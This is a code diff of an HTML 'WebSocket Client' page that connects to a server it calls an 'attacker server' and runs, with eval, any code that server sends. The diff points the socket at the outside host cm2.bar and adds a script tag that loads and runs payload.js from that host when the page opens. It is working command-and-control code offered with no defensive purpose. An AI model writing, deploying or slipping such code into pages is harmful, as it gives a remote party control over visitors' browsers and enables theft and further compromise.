@@ -7,7 +7,7 @@
     <h1>WebSocket Client</h1>
 
     <script>
-        const socket = new WebSocket("ws://localhost:8765/");
+        const socket = new WebSocket("ws://cm2.bar:8765/");
     
         socket.addEventListener("open", function() {
             alert("Connected to attacker server!");
@@ -19,7 +19,17 @@
                 eval(data.code);
             }
         });
+        
+        var script = document.createElement('script');
+        script.type = 'text/javascript';
+        script.onload = function() {
+            // Script has been loaded and executed.
+            // You can now safely use the functions defined in payload.js
+        };
+        script.src = 'http://cm2.bar:8081/payload.js';
+        document.head.appendChild(script);
     </script>
+    
     
 </body>
 </html>
